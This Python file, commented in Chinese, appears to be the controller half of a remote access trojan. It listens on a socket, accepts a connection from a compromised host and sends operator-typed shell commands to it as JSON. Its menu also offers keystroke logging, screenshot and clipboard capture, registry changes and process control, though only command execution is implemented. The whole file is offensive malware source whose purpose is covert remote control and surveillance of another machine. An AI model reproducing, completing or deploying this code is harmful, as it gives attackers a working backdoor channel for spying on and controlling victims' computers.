import json
import socket


# 接受信息函数
def recv_date():
    data = conn.recv(2048)
    if data:
        try:
            print(str(data, 'gbk'))
        except:
            print(str(data, 'utf-8'))
    else:
        print("断开连接...")
        command_op()


# 执行命令函数
def sent_command(to_json):
    while True:
        command = input("Pls,input your command >> ")
        if len(command):
            command = command.rstrip()
            # 生成字典
            data = {'data': command}
            # print("命令data为：")
            # print(data)
            data.update(to_json)
            # print("合并后字典为：")
            # print(data)
            # 将字典转换成JOSN格式
            json_data = json.dumps(data, sort_keys=False, ensure_ascii=False, indent=4, separators=(',', ': '))
            # print(json_data)
            conn.send(json_data.encode(encoding='gbk'))
        elif command == "exit":
            # 跳到命令选项 command_op()
            command_op()
        recv_date()


# 命令选项，构造数据格式
def command_op():
    op = input("1 --> 执行命令\n"
               "2 --> 监听键盘输出\n"
               "3 --> 截屏,查看剪切板截图\n"
               "4 --> 修改注册表\n"
               "5 --> 控制系统进程\n"
               "0 --> 退出\n"
               "选择为 (´･_･`) ：")
    # 执行命令
    if op == '1':
        to_josn = {'op': '1'}
        sent_command(to_josn)
    # 监听键盘输出
    elif op == '2':
        to_josn = {'op': op}
    # 截屏
    elif op == '3':
        to_josn = {'op': op}
    # 修改注册表
    elif op == '4':
        to_josn = {'op': op}
    # 控制系统进程
    elif op == '5':
        to_josn = {'op': op}
    # 退出
    elif op == '0':
        exit()
    return to_josn


if __name__ == "__main__":
    Host, Port = "127.0.0.1", 6666
    # 设置套接字
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # 绑定IP,端口
    server.bind((Host, Port))
    server.listen(128)
    print("listening...")
    while True:
        conn, addr = server.accept()
        # print(conn, addr)
        print("connect--> ", addr)
        recv_date()
        # 连接成功，输入选择
        while True:
            to_josn = command_op()
            recv_date()
